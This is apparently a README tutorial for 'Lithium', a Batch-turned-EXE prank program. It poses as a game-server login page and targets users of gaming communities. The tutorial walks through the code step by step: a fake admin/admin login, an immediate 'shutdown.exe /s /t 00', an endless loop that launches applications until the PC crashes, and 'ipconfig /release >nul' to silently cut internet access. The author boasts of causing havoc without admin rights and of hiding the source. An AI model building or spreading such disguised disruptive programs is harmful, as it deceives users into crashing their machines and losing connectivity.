# Lithium Explanation/Breakdown

If it wasn't obvious already, Lithium is indeed a troll..

- [Why?](#why)
    - [How?](#how)
        - [Tutorial](#tutorial)

# Why?
I created Lithium as a way to combat users in servers like Project Rift and Project Era from asking from multiplayer. It had become a big problem to higher ups, and constant annoyance, so you know I had to take action 😈

# How?
Lithium is a 12 KB Batch file that was converted to an EXE to hide the source. Lithium has the ability to completely shut down your PC, open as many applications as it wants, and even release your IP address (meaning no internet). All of these things happen because you give it permission

# Tutorial
To start off Lithium, we need the cringe login page, but before we even start that, we need to get our Batch file set up.

```bat
@echo off
mode con lines=30 cols=80
chcp 65001
:again
cls
title Lithium Gameserver 
echo Welcome [USER], please login:
echo.
echo ██╗     ██╗████████╗██╗  ██╗██╗██╗   ██╗███╗   ███╗
echo ██║     ██║╚══██╔══╝██║  ██║██║██║   ██║████╗ ████║
echo ██║     ██║   ██║   ███████║██║██║   ██║██╔████╔██║
echo ██║     ██║   ██║   ██╔══██║██║██║   ██║██║╚██╔╝██║
echo ███████╗██║   ██║   ██║  ██║██║╚██████╔╝██║ ╚═╝ ██║
echo ╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
echo.
```
The first line is ``@echo off``, this command is used to disable the echoing, or displaying on the screen, of characters entered at the keyboard. After that, we have the ``mode con lines=30 cols=80`` command. This will all depend on you, as it just resizes the command prompt window. Then we have ``chcp 65001``, which will come in handy later on. It helps the command prompt format the ASCII art correctly.

The ``::again`` command declares a new "page" sort of, or a way to divide different areas of code. ``title`` is pretty self explanatory, it sets the window title. The ``echo`` commands (in this case) declare text that needs to be show on the screen. The lines just have ``echo .`` are used as a blank white space, and the rest is the ASCII art. You can generate ASCII art [here](https://patorjk.com/software/taag/).

```bat
:: @echo off
:: mode con lines=30 cols=80
:: chcp 65001
:: again
:: cls
:: title Lithium Gameserver 
:: echo Welcome [USER], please login:
:: echo.
:: echo ██╗     ██╗████████╗██╗  ██╗██╗██╗   ██╗███╗   ███╗
:: echo ██║     ██║╚══██╔══╝██║  ██║██║██║   ██║████╗ ████║
:: echo ██║     ██║   ██║   ███████║██║██║   ██║██╔████╔██║
:: echo ██║     ██║   ██║   ██╔══██║██║██║   ██║██║╚██╔╝██║
:: echo ███████╗██║   ██║   ██║  ██║██║╚██████╔╝██║ ╚═╝ ██║
:: echo ╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
:: echo.
set /p user=Enter username: 
echo.
set /p pass=Enter password: 
if %user% == admin if %pass% == admin goto main
echo Authentication failed, login invalid..
timeout 2
goto again
```

The ``/p`` switch allows you to set the value of a variable to a line of input entered by the user. Displays the specified promptString before reading the line of input. Basically, we're asking the user for the set username and password. ``if %user% == admin if %pass% == admin goto main`` is used to check if the input matches the requirements. If it does, the user goes on. If it doesn't, the user is taken back to ``:again`` which is the login page.

Now, we're going to pass all of the boring shit and get straight to the havoc on how I was able to shut off the computer, releas IPs, and application bomb all without admin permissions.

```bat
shutdown.exe /s /t 00
```
This shutdown command is used to shut down the local computer immediately since we designated a time of zero with the shutdown /t option. You could easily change the zero in this command to 10 to delay the shutdown for several seconds, 60 to make the computer shut down in one minute, etc. Since it's an EXE and it's a command, there are no admin permissions needed.

```bat
:auto
cls
echo.
echo ██╗     ██╗████████╗██╗  ██╗██╗██╗   ██╗███╗   ███╗
echo ██║     ██║╚══██╔══╝██║  ██║██║██║   ██║████╗ ████║
echo ██║     ██║   ██║   ███████║██║██║   ██║██╔████╔██║
echo ██║     ██║   ██║   ██╔══██║██║██║   ██║██║╚██╔╝██║
echo ███████╗██║   ██║   ██║  ██║██║╚██████╔╝██║ ╚═╝ ██║
echo ╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
echo.
echo Enabling server auto-restart..
echo.
start mspaint

start notepad

start write

start cmd

start explorer

start control

start calc

goto auto
```

Pretty much, this is a simple application bomb. It starts all these programs over and over, then restarts just to do the same thing until your PC eventually crashes.

```bat
ipconfig /release >nul
```
This is probably the most worrying command out of them all. First, ipconfig /release is executed to force the client to immediately give up its lease by sending the server a DHCP release notification which updates the server's status information and marks the old client's IP address as "available". Then, the command ipconfig /renew is executed to request a new IP address.

In stupid terms, it gives up your IP, and without your IP, you can't really use your internet. To get a new IP, you have to type ``ipconfig /renew``. The ``>nul`` command after it is to anonymize it



So yes, Lithium was a troll. I will provide the source too so you can read it for yourself.
